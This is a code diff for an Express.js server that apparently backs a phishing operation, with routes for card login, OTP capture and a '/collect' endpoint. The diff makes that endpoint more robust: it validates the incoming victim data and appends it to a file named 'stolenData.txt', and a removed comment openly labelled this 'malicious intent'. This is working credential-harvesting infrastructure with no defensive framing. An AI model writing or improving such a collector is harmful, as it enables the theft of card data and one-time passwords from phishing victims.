@@ -2,7 +2,7 @@ const express = require('express')
 const path = require('path')
 const app = express();
 const cors = require('cors');
-
+const bodyParser = require("body-parser");
 // Enable CORS for all origins
 app.use(cors());
 
@@ -27,15 +27,39 @@ app.post('/crad/Login', (req, res) => {
 
 })
 
-app.post("/collect", (req, res) => {
-console.log("Exucuted....")
-    const userData = req.body;
-    console.log("Received user data:", userData);
+app.use(bodyParser.json());
 
-    // Save data to a file (malicious intent)
-    fs.appendFileSync("stolenData.txt", JSON.stringify(userData) + "\n");
-    res.status(200).send("Data received");
+// Route
+app.post("/collect", (req, res) => {
+    console.log("Executed....");
+    try {
+        const userData = req.body;
+
+        // Validate incoming data
+        if (!userData || typeof userData !== "object") {
+            console.error("Invalid data received:", userData);
+            return res.status(400).send("Invalid data format");
+        }
+
+        console.log("Received user data:", userData);
+
+        // Append data to file (check for errors)
+        const filePath = "stolenData.txt";
+        try {
+            fs.appendFileSync(filePath, JSON.stringify(userData) + "\n", "utf8");
+            console.log(`Data saved to ${filePath}`);
+        } catch (fileError) {
+            console.error("Error writing to file:", fileError);
+            return res.status(500).send("File write error");
+        }
+
+        res.status(200).send("Data received");
+    } catch (error) {
+        console.error("Unexpected error:", error);
+        res.status(500).send("Internal server error");
+    }
 });
+
 
 app.post('/AuthOtp', (req, res) => {
     console.log(res.body);
